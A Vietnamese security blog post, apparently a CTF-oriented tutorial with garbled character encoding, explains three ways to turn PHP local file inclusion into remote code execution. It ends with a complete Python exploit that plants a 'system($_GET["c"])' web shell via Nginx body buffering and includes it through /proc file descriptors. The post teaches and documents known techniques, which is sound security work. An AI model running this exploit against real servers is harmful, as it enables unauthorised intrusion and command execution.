---
title:  CÃ¡c kÄ© thuáº­t nÃ¢ng cao trong khai thÃ¡c lá»—  há»•ng PHP LFI2RCE
description: Má»™t vÃ i kÄ© thuáº­t khai thÃ¡c lá»— há»•ng RCE tá»« LFI mÃ  mÃ¬nh há»c Ä‘Æ°á»£c
author: to^
date: 2022-05-22 20:10:00 +0700
categories: [WebSec, CTF]
tags: [rce, lfi]     # TAG names should always be lowercase
img_path: /assets/img/PHP_LFI2RCE
image:
 src: RCE.jpg
 alt: RCE image
 width: 1000
 height: 400
---

_CÃ¡c kÄ© thuáº­t trong bÃ i viáº¿t Ä‘á»u cÃ³ thá»ƒ giÃºp khai thÃ¡c lá»—i RCE nhÆ°ng cáº§n cÃ³  sá»± trá»£ giÃºp cá»§a LFI_

## 1. PHP Session File Upload Progress Exploit

Äá»ƒ thá»±c hiá»‡n Ä‘Æ°á»£c cÃ¡ch khai thÃ¡c nÃ y Ä‘Ã²i há»i má»™t vÃ i cáº¥u hÃ¬nh cá»§a php server, vÃ¬ váº­y trÆ°á»›c tiÃªn ta cáº§n tÃ¬m hiá»ƒu vá» cÃ¡c thiáº¿t láº­p máº·c Ä‘á»‹nh trong `php.ini`:


- `session.upload_progress.enabled = on` Khi trÃ¬nh duyá»‡t upload má»™t file lÃªn server thÃ¬ php sáº½ lÆ°u thÃ´ng tin chi tiáº¿t vá» file nÃ y (cháº³ng háº¡n upload time, upload
progress, â€¦) trong session.

- `session.upload_progress.cleanup = on ` Sau khi file upload hoÃ n thÃ nh, session file sáº½ ngay láº­p tá»©c Ä‘Æ°á»£c xÃ³a

- `session.upload_progress.prefix = "upload_progress_"` prefix dÃ¹ng vá»›i upload progress key trong $_SESSION. Key nÃ y sáº½ Ä‘Æ°á»£c concatenated vá»›i giÃ¡ trá»‹ cá»§a `session.upload_progress.name` Ä‘á»ƒ cho ra má»™t index duy nháº¥t. GiÃ¡ trá»‹ máº·c Ä‘á»‹nh cá»§a prefix lÃ : "upload_progress_"

- `session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"` When it appears in the form, php will report the upload progress. Lá»£i tháº¿ lá»›n nháº¥t cá»§a ta Ä‘Ã³ lÃ  giÃ¡ trá»‹ cá»§a nÃ³ cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c.

- `session.auto_start=Off` Náº¿u lÃ  On thÃ¬ php sáº½ tá»± Ä‘á»™ng khá»Ÿi táº¡o session khi nháº­n request vÃ  khÃ´ng cáº§n pháº£i thá»±c thi session_start()

- `session.use_strict_mode=0` Ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c sessionid trong cookie vÃ  server sáº½ táº¡o session file tÆ°Æ¡ng á»©ng vá»›i nÃ³ â€œsess_sessidâ€

_**Session Ä‘Æ°á»£c báº¯t Ä‘áº§u trÃªn php nhÆ° tháº¿ nÃ o?**_

Äá»ƒ báº¯t Ä‘áº§u má»™t PHP session thÃ¬ ta cáº§n hÃ m `session_start()` hoáº·c thay Ä‘á»•i giÃ¡ trá»‹ cá»§a `session.auto_start` trong php.ini thÃ nh ON Ä‘á»ƒ auto session start
NhÆ°ng giÃ¡ trá»‹ máº·c Ä‘á»‹nh cá»§a nÃ³ lÃ  OFF vÃ¬ váº­y khÃ³ cÃ³ thá»ƒ khai thÃ¡c lá»—i nÃ y.

Ta cÃ³ thá»ƒ bypass Ä‘Æ°á»£c váº¥n Ä‘á» nÃ y náº¿u ta thÃªm 
"PHP_SESSION_UPLOAD_PROGRESS" trong multipart POST data, PHP sáº½ enable session cho chÃºng ta.

_**Session file Ä‘Æ°á»£c lÆ°u nhÆ° tháº¿ nÃ o ?**_

CÃ¡c file uploaded nÃ y sáº½ Ä‘Æ°á»£c lÆ°u dá»±a trÃªn `session.save_path` vÃ  giÃ¡ trá»‹ nÃ y thÆ°á»ng sáº½ Ä‘Æ°á»£c thiáº¿t láº­p máº·c Ä‘á»‹nh khÃ¡c nhau trong cÃ¡c phiÃªn báº£n cá»§a php
cÃ³ thá»ƒ lÃ  `/tmp/sess_{sessionid}` hoáº·c `/var/lib/php/sessions/sess_{sessionid}`

![1.png](1.png)


_**LÃ m sao Ä‘á»ƒ  bypass session_upload_progress.cleanup=ON?**_

NhÆ° Ä‘Ã£ nÃ³i á»Ÿ trÃªn thiáº¿t láº­p nÃ y lÃ  máº·c Ä‘á»‹nh vÃ  nÃ³ sáº½ xÃ³a táº¥t cáº£ progress information ngay khi hoÃ n thÃ nh quÃ¡ trÃ¬nh Ä‘á»c dá»¯ liá»‡u tá»« POST hay cÃ¡c file session cá»§a ta (Ä‘Æ°á»£c lÆ°u trong `save_path`) sáº½ ngay láº­p tá»©c bá»‹ xÃ³a.

VÃ¬ tháº¿ ta cáº§n trigger race condition Ä‘á»ƒ bypass váº¥n Ä‘á» nÃ y. DÆ°á»›i Ä‘Ã¢y lÃ  cÃ¡ch Ä‘á»ƒ race:

> You can trigger the race condition by creating custom python script to brute force a session file uploaded, by including session file from local file inclusion vulnerability you found in victim site until the file is catched.
(Extra: If you can see our previous demo, see the last curl on uploading session, I upload /etc/hostname as a file, you can upload large file to trying to slow down the victim site and (hanging) will result a fast race condition and it will be fast than upload small file).
{: .prompt-tip  }

![2.png](2.png)

Äá»ƒ Ä‘á»c ná»™i dung cá»§a file nÃ y ta dÃ¹ng vÃ²ng láº·p:
![3.png](3.png)

Ta tháº¥y ráº±ng giÃ¡ trá»‹ cá»§a `PHP_SESSION_UPLOAD_PROGRESS` lÃ  `Abusing PHP_SESION_UPLOAD_PROGRESS` Ä‘Æ°á»£c lÆ°u vÃ o file session váº­y náº¿u ta chÃ¨n má»™t Ä‘oáº¡n mÃ£ php vÃ  include nÃ³ thÃ´ng qua LFI thÃ¬ Ä‘iá»u gÃ¬ sáº½ xáº£y ra ? ğŸ˜Š => RCE

Má»™t Ä‘iá»u cáº§n lÆ°u Ã½ ná»¯a á»Ÿ kÄ© thuáº­t nÃ y Ä‘Ã³ lÃ  file session sáº½ chá»©a nhá»¯ng content rÃ¡c nÃªn Ä‘Ã´i khi khÃ´ng thÃ­ch há»£p cho má»™t sá»‘ trÆ°á»ng há»£p.

_Challenge: [one-line-php](https://github.com/to016/CTFs/tree/main/PHP_LFI2RCE_exploit/hitcon-ctf-2018) (hitconctf2018)_

## 2. PHP Temporary File Upload Exploit

PHP engine khi nháº­n Ä‘Æ°á»£c má»™t packet POST sáº½ táº¡o ra má»™t hoáº·c nhiá»u cÃ¡c temporary files Ä‘á»ƒ lÆ°u cÃ¡c uploaded file. PHP script xá»­ lÃ­ cÃ¡c file upload nÃ y sáº½ dÃ¹ng `move_uploaded_file()` Ä‘á»ƒ di chuyá»ƒn uploaded temporary file Ä‘áº¿n vá»‹ trÃ­ mong muá»‘n náº¿u script cáº§n sá»­ dá»¥ng Ä‘áº¿n file nÃ y cho Ä‘áº¿n khi hoÃ n thÃ nh cÃ´ng viá»‡c. VÃ  khi script nÃ y hoÃ n thÃ nh cÃ´ng viá»‡c PHP engine sáº½ loáº¡i bá» temporary files á»©ng vá»›i files uploaded.

HÃ¬nh sau lÃ  timeline cá»§a quÃ¡ trÃ¬nh Ä‘á» cáº­p á»Ÿ trÃªn:

![4.png](4.png)

VÃ¬ tháº¿ ta cÃ³ thá»ƒ upload má»™t PHP script vÃ  táº­n dá»¥ng lá»—i LFI Ä‘á»ƒ include temp file nÃ y vÃ o tá»« Ä‘Ã³ => RCE ğŸ˜Š

Tin tá»‘t á»Ÿ Ä‘Ã¢y lÃ  PHP script thÆ°á»ng sáº½ access Ä‘áº¿n thÆ° má»¥c nÆ¡i mÃ  temporary files Ä‘Æ°á»£c táº¡o. ThÆ° má»¥c máº·c Ä‘á»‹nh thÆ°á»ng lÃ  `/tmp` trÃªn linux hoáº·c `C:\Windows\Temp` trÃªn windows.

Tin xáº¥u lÃ  tÃªn cá»§a temp files nÃ y lÃ  random ğŸ˜, Ä‘iá»u nÃ y gÃ¢y ra sá»± cáº£n trá»Ÿ trong viá»‡c Ã¡p dá»¥ng kÄ© thuáº­t nÃ y. TrÃªn linux giÃ¡ trá»‹ random nÃ y lÃ  6 kÃ­ tá»± (A-Za-z0-9) vÃ  Ä‘Æ°á»£c thÃªm vÃ o sau "/tmp/php" prefix e.g /tmp/phpUsM123.
Báº¥t lá»£i á»Ÿ trÃªn dáº«n Ä‘áº¿n viá»‡c muá»‘n khÃ¡i thÃ¡c lá»— há»•ng nÃ y cáº§n thá»a cÃ¡c giáº£ thuyáº¿t:

![Assuming.png](Assuming.png)

BÃªn cáº¡nh Ä‘Ã³ tÃ¡c giáº£ cá»§a bÃ i nghiÃªn cá»©u vá»  kÄ© thuáº­t nÃ y cÃ²n Ä‘á» cáº­p vá» Ã½ tÆ°á»Ÿng cá»§a há»: 

![Idea.png](Idea.png)

Hmmmm, chung quy láº¡i thÃ¬ máº¥u chá»‘t váº«n lÃ  pháº£i tÃ¬m Ä‘Æ°á»£c tÃªn cá»§a temp file.
VÃ´ tÃ¬nh lÆ°á»›t qua má»™t bÃ i viáº¿t trÃªn hacktricks thÃ¬ há» cÃ³ Ä‘á» cáº­p thÃªm cÃ¡c Ä‘iá»u kiá»‡n Ä‘á»ƒ há»— trá»£ khai thÃ¡c cho lá»—i nÃ y: `LFI with PHPinfo assistance.`

> To exploit this vulnerability you need: A LFI vulnerability, a page where phpinfo() is displayed, "file_uploads = on" and the server has to be able to write in the "/tmp" directory.
{: .prompt-info  }

Äáº¡i khÃ¡i lÃ  sáº½ cÃ³ má»™t trang display content cá»§a phpinfo() tá»« Ä‘Ã³ ta cÃ³ thá»ƒ leak Ä‘Æ°á»£c directory Ä‘áº¿n temp file vá»«a upload thÃ´ng qua giÃ¡ trá»‹ cá»§a biáº¿n `$_FILES`. 

BÃªn cáº¡nh Ä‘Ã³ cÃ²n má»™t khÃ¡i niá»‡m liÃªn quan lÃ  PHP output buffering:
> PHP uses a buffer of 4096B and when it is full, it is send to the client. Then the client can send a lot of big requests (using big headers) uploading a php reverse shell, wait for the first part of the phpinfo() to be returned (where the name of the temporary file is) and try to access the temp file before the php server deletes the file exploiting a LFI vulnerability.
{: .prompt-info  }

CÃ³ thá»ƒ hiá»ƒu PHP output buffering nhÆ° sau

![PHPOutputBuffer](PHPOutputBuffer.png)

_Challenge: [easy php](http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/) (n1ctf2018)_

## 3. PHP LFI with Nginx Assistance

Section nÃ y nÃ³i vá» kÄ© thuáº­t khai thÃ¡c cÅ©ng dá»±a trÃªn LFI nhÆ°ng Ä‘áº·c biá»‡t hÆ¡n á»Ÿ chá»— PHP Ä‘Æ°á»£c káº¿t há»£p vá»›i Nginx server dÆ°á»›i má»™t vÃ i cáº¥u hÃ¬nh Ä‘áº·c trÆ°ng.

CÃ¡c kÄ© thuáº­t Ä‘Ã£ nÃ³i á»Ÿ trÃªn dá»u dá»±a vÃ o viá»‡c thá»±c hiá»‡n LFI Ä‘á»‘i vá»›i session file hoáº·c temp file Ä‘á»ƒ RCE. HÃ£y xem má»™t vÃ­ dá»¥ cho trÆ°á»ng há»£p cÃ¡c tricks á»Ÿ trÃªn khÃ´ng thá»ƒ dÃ¹ng Ä‘Æ°á»£c:

Source code:

```php
<?php include_once($_GET['file']);
```

FPM / PHP config:
```conf
php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
```

VÃ  setup permission Ä‘á»ƒ khÃ´ng thá»ƒ include file tá»« 2 folder nÃ y
```
chown -R 0:0 /tmp /var/tmp /var/lib/php/sessions
chmod -R 000 /tmp /var/tmp /var/lib/php/sessions
```

May máº¯n thay, PHP hiá»‡n nay thÆ°á»ng Ä‘Æ°á»£c deployed thÃ´ng qua PHP-FPM vÃ  Nginx. Nginx cung cáº¥p má»™t cÆ¡ cháº¿  Ä‘á»ƒ quáº£n lÃ­ requests body size gá»i lÃ  [client body buffering](https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size). Náº¿u client body lá»›n hÆ¡n má»™t giÃ¡ trá»‹ Ä‘Ã£ cáº¥u hÃ¬nh trÆ°á»›c thÃ¬ sáº½ báº¯t Ä‘áº§u táº¡o ra temporary files vÃ  ghi vÃ o Ä‘Ã³. VÃ  tÃ­nh nÄƒng nÃ y vÃ´ tÃ¬nh lÃ m cho LFI2RCE trá»Ÿ nÃªn kháº£ thi ğŸ˜¬.

Temp file nÃ y sáº½ Ä‘Æ°á»£c xÃ³a ngay sau khi Ä‘Æ°á»£c xá»­ lÃ­ bá»Ÿi Nginx. NhÆ°ng ta cÃ³ thá»ƒ lá»£i dá»¥ng `procfs` Ä‘á»ƒ tham chiáº¿u nÃ³ thÃ´ng qua race condition: 

```
/proc/34/fd:
total 0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -> anon_inode:[eventfd]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -> socket:[27587]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -> socket:[27589]
lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -> socket:[44926]
lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -> socket:[44927]
lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -> /var/lib/nginx/body/0000001368 (deleted)
```

> One cannot directly include /proc/34/fd/15 in this example as PHP's include function would resolve the path to /var/lib/nginx/body/0000001368 (deleted) which doesn't exist in in the filesystem. This minor restriction can luckily be bypassed by some indirection like: /proc/self/fd/34/../../../34/fd/15 which will finally execute the content of the deleted /var/lib/nginx/body/0000001368 file.
{: .prompt-tip  }

_Challenge: a simple [challenge](https://github.com/to016/CTFs/tree/main/PHP_LFI2RCE_exploit/php-lfi-with-nginx-assistance) for approach_

Ã€ má»™t lÆ°u Ã½ ná»¯a Ä‘Ã³ lÃ  cÃ¡ch nÃ y chá»‰ dÃ¹ng Ä‘Æ°á»£c khi Nginx cháº¡y vá»›i cÃ¹ng user cá»§a PHP (thÆ°á»ng lÃ  www-data).
LÃ­ do thÃ¬ mÃ¬nh cÃ³ mail há»i tÃ¡c giáº£ vÃ  há» rep nhÆ° sau:

![rep](rep.png)

script exploit:
```py
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes 
r  = requests.get(URL, params={
    'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'file': f,
                'c': f'id'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```
## TÃ i liá»‡u tham kháº£o

[LFI_With_PHPInfo_Assistance](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)

[What is PHP Output Buffering?](https://notlaura.com/output-buffering/)

[PHP_LFI_rfc1867_temporary_files](https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf)

[File Inclusion/Path traversal - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

[PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)




